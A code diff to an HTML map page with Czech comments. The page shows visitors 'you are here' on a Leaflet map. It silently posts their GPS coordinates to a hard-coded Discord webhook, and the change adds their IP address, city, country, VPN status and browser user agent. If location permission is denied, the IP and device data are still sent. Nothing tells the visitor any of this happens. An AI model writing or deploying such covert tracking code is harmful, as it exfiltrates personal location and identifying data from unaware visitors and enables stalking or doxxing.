@@ -16,24 +16,44 @@
 <div id="map"></div>
 
 <script>
-    function sendLocationToWebhook(latitude, longitude) {
-        const webhookURL = "https://discord.com/api/webhooks/1336736765674917979/lyGotJhq7TWp2kRsHpd_246EPiXxMZ91S3rKDVuq54iFQX-FY8TlJ7pat1eBph-KL0XC";
-        const data = {
-            content: `📍 **Nová lokace:**\n🌍 Latitude: ${latitude}\n🌍 Longitude: ${longitude}\n🔗 [Zobrazit na mapě](https://www.google.com/maps?q=${latitude},${longitude})`
-        };
+    const webhookURL = "https://discord.com/api/webhooks/1336736765674917979/lyGotJhq7TWp2kRsHpd_246EPiXxMZ91S3rKDVuq54iFQX-FY8TlJ7pat1eBph-KL0XC";
+
+    async function getIPInfo() {
+        try {
+            const response = await fetch("https://ipapi.co/json/");
+            const data = await response.json();
+            return {
+                ip: data.ip,
+                city: data.city || "Neznámé město",
+                country: data.country_code || "Neznámá země",
+                vpn: data.security ? (data.security.vpn ? "TRUE" : "FALSE") : "Neznámé"
+            };
+        } catch (error) {
+            console.error("Chyba při získávání IP:", error);
+            return { ip: "Neznámá", city: "Neznámé", country: "Neznámé", vpn: "Neznámé" };
+        }
+    }
+
+    function sendLocationToWebhook(latitude, longitude, ipInfo, userAgent) {
+        const mapyCzURL = `https://mapy.cz/zakladni?x=${longitude}&y=${latitude}&z=15`;
+        const message = `📱 **Zařízení:** ${userAgent}
+🌍 **IP Adresa:** ${ipInfo.ip} (Město: ${ipInfo.city}, Země: ${ipInfo.country})
+🌐 **VPN:** ${ipInfo.vpn}
+📍 **GPS Lokace:** [Otevřít na Mapy.cz](${mapyCzURL})`;
 
         fetch(webhookURL, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(data)
+            body: JSON.stringify({ content: message })
         })
         .then(response => console.log("Lokace odeslána:", response))
         .catch(error => console.error("Chyba při odesílání:", error));
     }
 
-    function showLocation(position) {
+    function showLocation(position, ipInfo) {
         const latitude = position.coords.latitude;
         const longitude = position.coords.longitude;
+        const userAgent = navigator.userAgent;
 
         // Zobrazit mapu
         const map = L.map('map').setView([latitude, longitude], 15);
@@ -45,20 +65,40 @@
             .bindPopup("Tady jsi!")
             .openPopup();
 
-        // Odeslat na webhook
-        sendLocationToWebhook(latitude, longitude);
+        // Odeslat data na webhook
+        sendLocationToWebhook(latitude, longitude, ipInfo, userAgent);
     }
 
-    function errorHandler(error) {
-        console.error("Chyba při získávání polohy:", error);
-        alert("Nepodařilo se získat polohu.");
+    function errorHandler(error, ipInfo) {
+        const userAgent = navigator.userAgent;
+        const message = `📱 **Zařízení:** ${userAgent}
+🌍 **IP Adresa:** ${ipInfo.ip} (Město: ${ipInfo.city}, Země: ${ipInfo.country})
+🌐 **VPN:** ${ipInfo.vpn}
+🚫 **GPS není potvrzena**`;
+
+        fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: message })
+        })
+        .then(response => console.log("Chyba GPS odeslána:", response))
+        .catch(error => console.error("Chyba při odesílání:", error));
     }
 
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showLocation, errorHandler);
-    } else {
-        alert("Geolokace není podporována v tomto prohlížeči.");
+    async function init() {
+        const ipInfo = await getIPInfo();
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                position => showLocation(position, ipInfo),
+                error => errorHandler(error, ipInfo)
+            );
+        } else {
+            errorHandler({ message: "Geolokace není podporována" }, ipInfo);
+        }
     }
+
+    init();
 </script>
 
 </body>
